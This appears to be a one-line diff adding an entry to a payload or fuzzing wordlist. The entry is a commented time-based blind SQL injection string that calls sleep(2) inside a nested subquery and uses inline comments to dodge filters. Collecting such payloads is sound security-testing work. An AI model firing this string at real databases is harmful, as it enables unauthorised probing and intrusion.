@@ -1,0 +1,1 @@
+# 'and(select*from(select+sleep(2))a/**/union/**/select+1)='
